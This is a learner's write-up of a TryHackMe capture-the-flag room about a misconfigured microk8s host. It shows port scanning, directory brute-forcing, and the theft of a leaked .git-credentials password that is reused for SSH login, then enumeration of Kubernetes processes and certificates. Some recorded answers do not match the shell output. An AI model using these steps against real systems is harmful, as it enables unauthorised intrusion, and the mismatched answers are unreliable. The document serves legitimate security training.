<h1 align="center">Frank & Herby make an app</h1>
<p align="center">2025, August 11<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>462</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Learn how the misconfiguration of containers can lead to opportunities for some and disasters for others</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/e7d19f62-eef6-4483-928f-6dd4ff13632c"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/frankandherby">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/151765bb-28dd-4d89-b0e9-bc99f3a83ac4"></p>


<br>



<h2>Task 1 . Frank & Herb Nake and App!</h2>
<p>Make sure to wait 5 minutes after the machine starts up before starting recon.<br>

Containers are really cool, but they have security considerations just like everything else.  Break into the box and then figure out how to get root access!<br>

This box will require some research into how to use microk8s.<br>

Our story so far....<br>
Two developers are venturing into the world of Kubernetes. Little do these developers know that their lack of understanding in 'k8s', containers, and git has left their resources open to exploitation!<br>

<p><em>Answer the questions below</em></p>

<br>

<p>

- nodeport range =  30000-32767
- ports open = 22, ..., 31337 and 32000</p>

```bash
:~/FrankHerby# nmap -p- 10.201.67.197
...
PORT      STATE SERVICE
22/tcp    open  ssh
3000/tcp  open  ppp
10250/tcp open  unknown
10255/tcp open  unknown
10257/tcp open  unknown
10259/tcp open  unknown
16443/tcp open  unknown
25000/tcp open  icl-twobase1
31337/tcp open  Elite
32000/tcp open  unknown
```

<br>

<p>1.1. What port has a webpage frank was able to stand up? <br>
<code>31337</code></p>

<br>


<h3>31337</h3>

<img width="1157" height="627" alt="image" src="https://github.com/user-attachments/assets/de632fd9-2fdf-45bd-a46c-08e17b78006a" />

<h4>gobuster</h4>

```bash
:~/FrankHerby# gobuster dir -u http://10.201.67.197:31337/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 80
...
/assets               (Status: 301) [Size: 169] [--> http://10.201.67.197/assets/]
/css                  (Status: 301) [Size: 169] [--> http://10.201.67.197/css/]
/vendor               (Status: 301) [Size: 169] [--> http://10.201.67.197/vendor/]
```

<img width="1326" height="425" alt="image" src="https://github.com/user-attachments/assets/422a8190-969d-4d51-a2cb-43f414be7eb3" />

<br>

<h4>dirsearch</h4>

<img width="1335" height="419" alt="image" src="https://github.com/user-attachments/assets/20099d75-ef34-430e-9278-6758d7542d3d" />

```bash
:~/FrankHerby# dirsearch -u http://10.201.67.197:31337/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/FrankHerby/reports/http_10.201.67.197_31337/__25-08-12_04-09-43.txt

Target: http://10.201.67.197:31337/

[04:09:43] Starting: 
[04:09:44] 200 -   50B  - /.git-credentials
...
```

<br>

<h3>.git-credentials</h3>

<img width="480" height="113" alt="image" src="https://github.com/user-attachments/assets/309bb1da-0495-4dbf-bb1b-fb530f5f49ac" />

http://frank:f%40an3-1s-E337%21%21@192.168.100.50  =

f@an3-1s-E337!!@192.168.100.50


<img width="1183" height="185" alt="image" src="https://github.com/user-attachments/assets/023b8aef-5907-41e7-a926-c1e4939a05c3" />



<br>

<p>1.2. What port has a webpage frank was able to stand up? <br>
<code>.git-credentials7</code></p>

<br>


```bash
:~/FrankHerby# ssh frank@10.201.67.197
...

frank@dev-01:~$
```

<img width="1205" height="235" alt="image" src="https://github.com/user-attachments/assets/39bc16fc-e959-4370-9adc-ea384e55ca9c" />


<br>

<p>1.3. What is the user.txt flag?<br>
<code>.git-credentials7</code></p>

<br>

```bash

frank@dev-01:~$ pwd
/home/frank
frank@dev-01:~$ ls
repos  snap  user.txt
frank@dev-01:~$ cat user.txt
THM{F@nkth3T@nk}
frank@dev-01:~$
```

<br>


<img width="1466" height="192" alt="image" src="https://github.com/user-attachments/assets/70f855a2-96fc-4881-9df4-f6ff7b82e1f1" />

<br>


```bash
frank@dev-01:~/repos/dk-ml/.git/logs$ which microk8s
/snap/bin/microk8s
frank@dev-01:~/repos/dk-ml/.git/logs$ ls -lah /snap/bin/microk8s
lrwxrwxrwx 1 root root 13 Oct  3  2021 /snap/bin/microk8s -> /usr/bin/snap
frank@dev-01:~/repos/dk-ml/.git/logs$ snap list microk8s
Name      Version  Rev   Tracking     Publisher   Notes
microk8s  v1.21.5  2546  1.21/stable  canonical\u2713  classic
/main
  remotes/origin/main
```


```bash
frank@dev-01:~/repos/dk-ml/.git/logs$ ps aux | grep microk8s
root         711  0.0  0.1   6124  3428 ?        Ss   02:46   0:02 /bin/bash /snap/microk8s/2546/apiservice-kicker
root         713  0.0  0.1   5728  2512 ?        Ss   02:46   0:00 /bin/bash /snap/microk8s/2546/run-cluster-agent-with-args
root         714  1.3  1.8 1406260 38584 ?       Ssl  02:46   0:40 /snap/microk8s/2546/bin/containerd --config /var/snap/microk8s/2546/args/containerd.toml --root /var/snap/microk8s/common/var/lib/containerd --state /var/snap/microk8s/common/run/containerd --address /var/snap/microk8s/common/run/containerd.sock
root        1170  0.0  0.8  63256 17532 ?        S    02:46   0:01 python3 /snap/microk8s/2546/usr/bin/gunicorn3 cluster.agent:app --bind 0.0.0.0:25000 --keyfile /var/snap/microk8s/2546/certs/server.key --certfile /var/snap/microk8s/2546/certs/server.crt --timeout 240
root        1531  0.0  1.3  86780 26472 ?        S    02:46   0:00 python3 /snap/microk8s/2546/usr/bin/gunicorn3 cluster.agent:app --bind 0.0.0.0:25000 --keyfile /var/snap/microk8s/2546/certs/server.key --certfile /var/snap/microk8s/2546/certs/server.crt --timeout 240
root        2116  8.7 30.4 2095624 618556 ?      Ssl  02:48   4:06 /snap/microk8s/2546/kubelite --scheduler-args-file=/var/snap/microk8s/2546/args/kube-scheduler --controller-manager-args-file=/var/snap/microk8s/2546/args/kube-controller-manager --proxy-args-file=/var/snap/microk8s/2546/args/kube-proxy --kubelet-args-file=/var/snap/microk8s/2546/args/kubelet --apiserver-args-file=/var/snap/microk8s/2546/args/kube-apiserver --kubeconfig-file=/var/snap/microk8s/2546/credentials/client.config --start-control-plane=true
root        3810  0.0  0.1 713060  3376 ?        Sl   02:50   0:00 /snap/microk8s/2546/bin/containerd-shim-runc-v1 -namespace k8s.io -id 67a55067c4cb3e5fdfdf82a063c25928d27641e9b98a95ecac45a47dfe694c95 -address /var/snap/microk8s/common/run/containerd.sock
root        5162  0.1  0.3 713316  6888 ?        Sl   02:51   0:03 /snap/microk8s/2546/bin/containerd-shim-runc-v1 -namespace k8s.io -id 54a411e927798238f22c2d0112958fc95046fd80a6dc144291e6c1869537e38e -address /var/snap/microk8s/common/run/containerd.sock
root        5821  0.0  0.1 711652  3848 ?        Sl   02:51   0:00 /snap/microk8s/2546/bin/containerd-shim-runc-v1 -namespace k8s.io -id c492e5c67860d430f5e213a22c2efa6759c80a5ec8e69b55e3e83f2761d64429 -address /var/snap/microk8s/common/run/containerd.sock
root        5836  0.0  0.2 711396  4080 ?        Sl   02:51   0:00 /snap/microk8s/2546/bin/containerd-shim-runc-v1 -namespace k8s.io -id da599eff907c48fe8b2144e47cac0282044963b4da4b196c723ff936eefd12c4 -address /var/snap/microk8s/common/run/containerd.sock
root        6033  0.0  0.2 713060  5840 ?        Sl   02:51   0:00 /snap/microk8s/2546/bin/containerd-shim-runc-v1 -namespace k8s.io -id 61a86920ac4a3ffdce9e1fcf37edf758ff90a768ad6d8947dea8ad36cfe9f2d9 -address /var/snap/microk8s/common/run/containerd.sock
root        6131  0.0  0.1 711396  3568 ?        Sl   02:51   0:00 /snap/microk8s/2546/bin/containerd-shim-runc-v1 -namespace k8s.io -id b66a3e8c91c12036cf836307708b8ecebcdd2ed13c55be89ff679f142908df7b -address /var/snap/microk8s/common/run/containerd.sock
root        6260  0.0  0.2 711652  4176 ?        Sl   02:51   0:00 /snap/microk8s/2546/bin/containerd-shim-runc-v1 -namespace k8s.io -id 1c5108331d2100a6218bd78001cc04a6943ab196f7bd0e13d1fe0da1b9e78d9c -address /var/snap/microk8s/common/run/containerd.sock
root        6335  0.0  0.3 713316  7688 ?        Sl   02:51   0:01 /snap/microk8s/2546/bin/containerd-shim-runc-v1 -namespace k8s.io -id f6c08e67db0d25cd6eaf2f5db024194dab3b9fa7dcc3dffe7551001776a75948 -address /var/snap/microk8s/common/run/containerd.sock
root        6419  0.0  0.2 713060  4616 ?        Sl   02:51   0:00 /snap/microk8s/2546/bin/containerd-shim-runc-v1 -namespace k8s.io -id eb0eb5a429854f2af1d1d108b11247e67fc112335eac799c979416bf2cbe2474 -address /var/snap/microk8s/common/run/containerd.sock
root        6601  0.0  0.1 711396  3704 ?        Sl   02:51   0:00 /snap/microk8s/2546/bin/containerd-shim-runc-v1 -namespace k8s.io -id c76177b603bf9142f2ce5625f8a60a3b71bea961f5b6af525bd332d74f554dbf -address /var/snap/microk8s/common/run/containerd.sock
root        6772  0.0  0.2 713060  5256 ?        Sl   02:52   0:00 /snap/microk8s/2546/bin/containerd-shim-runc-v1 -namespace k8s.io -id 8fd70679c33f4e5b24d514b21bad643757c1baf4f1906683b131c6e2a5291b21 -address /var/snap/microk8s/common/run/containerd.sock
root        7693  0.3  0.2 713060  5188 ?        Sl   02:52   0:08 /snap/microk8s/2546/bin/containerd-shim-runc-v1 -namespace k8s.io -id 53641ed01a0b5df5f20ced214a7cd6228abd524c4e719032656cd3c83296b499 -address /var/snap/microk8s/common/run/containerd.sock
frank      68677  0.0  0.1   5192  2500 pts/0    S+   03:35   0:00 grep --color=auto microk8s
```

```bash
frank@dev-01:/var/run$ find / type -name *.io 2>/dev/null
/snap/core20/1169/usr/share/doc/netplan.io
/snap/core20/1081/usr/share/doc/netplan.io
/snap/core18/2246/usr/share/doc/netplan.io
/snap/core18/2128/usr/share/doc/netplan.io
/usr/share/docker.io
/usr/share/doc/docker.io
/usr/share/doc/netplan.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/apiregistration.k8s.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/admissionregistration.k8s.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/apiextensions.k8s.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/node.k8s.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/networking.k8s.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/flowcontrol.apiserver.k8s.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/coordination.k8s.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/rbac.authorization.k8s.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/authentication.k8s.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/certificates.k8s.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/discovery.k8s.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/storage.k8s.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/events.k8s.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/authorization.k8s.io
/home/frank/.kube/cache/discovery/127.0.0.1_16443/scheduling.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/apiregistration.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/admissionregistration.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/apiextensions.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/node.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/networking.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/flowcontrol.apiserver.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/coordination.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/rbac.authorization.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/authentication.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/certificates.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/discovery.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/storage.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/events.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/authorization.k8s.io
/home/frank/.kube/discovery/127.0.0.1_16443/scheduling.k8s.io
```


```bash
frank@dev-01:/var/run$ find / type -name server.crt 2>/dev/null
/snap/rocketchat-server/1485/programs/server/node_modules/node-gyp/test/fixtures/server.crt
/snap/rocketchat-server/1484/programs/server/node_modules/node-gyp/test/fixtures/server.crt
/snap/microk8s/2546/certs-beta/server.crt
/snap/microk8s/2546/microk8s-resources/certs-beta/server.crt
/var/snap/microk8s/2546/certs/server.crt
```

```bash
frank@dev-01:/var/run$ find / type -name kubectl 2>/dev/null
/snap/microk8s/2546/default-args/kubectl
/snap/microk8s/2546/kubectl
/snap/microk8s/2546/microk8s-resources/default-args/kubectl
/var/snap/microk8s/2546/args/kubectl

```


frank@dev-01:/var/snap/microk8s/2546/certs$ cat ca.crt
-----BEGIN CERTIFICATE-----
MIIDDzCCAfegAwIBAgIUItSnhhe8LpqTg+PJi/1G2u5vPHUwDQYJKoZIhvcNAQEL
BQAwFzEVMBMGA1UEAwwMMTAuMTUyLjE4My4xMB4XDTIxMTAwMzE1MzE0OVoXDTMx
MTAwMTE1MzE0OVowFzEVMBMGA1UEAwwMMTAuMTUyLjE4My4xMIIBIjANBgkqhkiG
9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvPY+vbDmMmCiGMk51jFVmICu9e3zaT7RQ3im
TgAjtYi8xpnaqo85BEAjaexqmlbyKhtZXgBA7ropvOpeIdFpQDg3bYsf39kvXUVW
kBNaPK7tM7FlmG3nNs7nDL/NabZDMXV9xq+MPUhkyr5oYQFUnTiJ0dG50RdFbKMM
4PrFWVE8XQY2fJAigLAJG2iB4DbVHm5oJGqYtSmhYp9zHWFMDS4Msy5nl1UB7t7m
oIkiwJbkTyLK/l75NxoWr1a905bhDNOcDONQSIplkDppEnfutPbtSWC4XXr3e1Lq
4Qiy+XAa2plc8Gwz/UjYBhHOWnpBKPLJKO4MCMfG4t4PggOVFQIDAQABo1MwUTAd
BgNVHQ4EFgQUH+SBan2m9jU0CVKgCGLsV6Xb5twwHwYDVR0jBBgwFoAUH+SBan2m
9jU0CVKgCGLsV6Xb5twwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOC
AQEAgfvhOd04yiPs/WSUMtbdDqr2ddYTCPTsfkRCTKq2/t+I15XU9ysDD9T8bMcK
c91CnrU2TEPlAToDaghNQsz6FE5BqJWbyXAnN5isSQwwkqxN809EJ70To6vT9Qq2
Za9Q2AJjbnxjs681F6WDgYuwZ2tBwsuuV+Eepz7jd7VCZ3GQD5xTqcANVnlDmVrq
4amoqoH7MHJZ4eDh/dWh5gVz8yXMWXsLEECV4sWmEyO/gOUiWiUEe+flV7fg+9mL
QwJVNIpmVPOafovvteuwVYf45A/jDu2OJwqc7QgRDgDLPJwKTy4sK7iN15tFbLNA
UoV5WBDnercAPHKj95gzAmkvoQ==
-----END CERTIFICATE-----




<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 12   |   463    |     127ᵗʰ    |      5ᵗʰ     |     340th   |     7ᵗʰ    | 120,596  |    910    |    73     |


</div>

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/3efe5828-3cd2-44ab-a142-e2a7ad152154" />


<img width="1878" height="887" alt="image" src="https://github.com/user-attachments/assets/7d0505ae-bc08-46a2-9e38-628a6ecc713c" />


<img width="1888" height="904" alt="image" src="https://github.com/user-attachments/assets/f58b618b-cd03-4509-b517-cc196ea7bc1a" />

<img width="1893" height="894" alt="image" src="https://github.com/user-attachments/assets/0cb3e863-af34-4a1c-ad47-f2b544e2fff5" />


<img width="1892" height="896" alt="image" src="https://github.com/user-attachments/assets/aacaf1d0-afcd-4ffd-a4ac-8f3c0f8e983f" />


  
